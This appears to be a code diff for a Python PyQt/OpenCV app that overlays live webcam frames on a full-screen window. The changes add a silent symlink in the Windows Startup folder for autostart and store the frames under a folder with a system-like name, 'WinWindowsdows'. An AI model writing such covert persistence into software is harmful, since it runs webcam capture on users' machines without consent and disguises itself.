@@ -1,3 +1,4 @@
+import os
 import sys
 
 import cv2
@@ -11,14 +12,13 @@ class CustomWindow(QMainWindow):
     def paintEvent(self, event=None):
         painter = QPainter(self)
         size = 50
-        image = QImage('res.png')
+        image = QImage(os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData\\Local\\WinWindowsdows\\res.png'))
         if not image.isNull():
             painter.setOpacity(0.0)
             painter.setBrush(Qt.white)
             painter.setPen(QPen(Qt.white))
             painter.drawRect(self.rect())
             painter.setOpacity(1.0)
-            painter.begin(image)
             painter.drawImage(self.rect(), image)
             painter.setBrush(Qt.lightGray)
             painter.setPen(QPen(Qt.lightGray))
@@ -46,7 +46,8 @@ def show_webcam(win, mirror=True):
             img = cv2.flip(img, 1)
         alpha = np.full_like(img[..., 0], 20)
         bgra = cv2.merge((img, alpha))
-        cv2.imwrite('res.png', bgra)
+        cv2.imwrite(os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData\\Local\\WinWindowsdows\\res.png'),
+                    bgra)
         win.repaint()
         if cv2.waitKey(1) == 27:
             break  # esc to quit
@@ -54,6 +55,17 @@ def show_webcam(win, mirror=True):
 
 
 def start():
+    lnkPath = os.path.join(os.path.join(os.environ['USERPROFILE']),
+                           'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinWindowsdows.exe')
+    folderPath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData\\Local\\WinWindowsdows')
+    if not os.path.exists(lnkPath):
+        try:
+            os.symlink(os.path.join(os.getcwd(), 'winwindowsdows.exe'), lnkPath)
+        except Exception as e:
+            print(e)
+
+    if not os.path.exists(folderPath):
+        os.mkdir(folderPath)
     app = QApplication([])
     app.setQuitOnLastWindowClosed(False)
 
@@ -81,7 +93,7 @@ def start():
     # Run the application
     window.showFullScreen()
     show_webcam(window)
-    sys.exit(app.exec_())
+    app.exec_()
 
 
 if __name__ == '__main__':
